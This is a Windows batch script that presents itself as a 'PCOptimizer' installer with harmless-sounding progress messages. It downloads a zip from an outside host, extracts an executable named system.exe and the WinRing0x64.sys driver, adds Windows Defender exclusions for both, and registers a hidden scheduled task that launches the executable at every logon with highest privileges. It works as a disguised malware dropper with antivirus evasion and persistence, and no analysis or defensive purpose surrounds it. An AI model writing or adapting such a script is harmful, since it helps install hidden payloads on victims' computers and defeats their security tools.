@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
set "URL=https://bimsfault.net/test.zip"
set "APP_NAME=PCOptimizer"
set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
set "EXE_NAME=system.exe"
set "DRIVER_NAME=WinRing0x64.sys"
:: =========================================

echo [1/6] Scanning system for performance issues...
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Please run this as Administrator.
    pause
    exit /b 1
)

echo [2/6] Analyzing registry for optimization opportunities...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [3/6] Downloading latest optimization database...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
if %errorlevel% neq 0 (
    echo ERROR: Database update failed.
    pause
    exit /b 1
)

echo [4/6] Installing performance enhancements...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo ERROR: Installation failed.
    pause
    exit /b 1
)

del "%ZIP_PATH%" >nul 2>&1

echo [5/6] Configuring system settings for optimal performance...
if exist "%INSTALL_DIR%\pc-optimizer" (
    xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
    rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
)

:: Add exclusions before running the executable
echo [5/7] Configuring gpu for optimal performance...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"

echo [6/7] Creating files...

schtasks /create /tn "%APP_NAME%" ^
 /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
 /sc onlogon ^
 /rl highest ^
 /f >nul

if %errorlevel% neq 0 (
    echo ERROR.
    pause
    exit /b 1
)

echo [7/7] Finalizing installation...

echo.
echo Installation complete.
pause
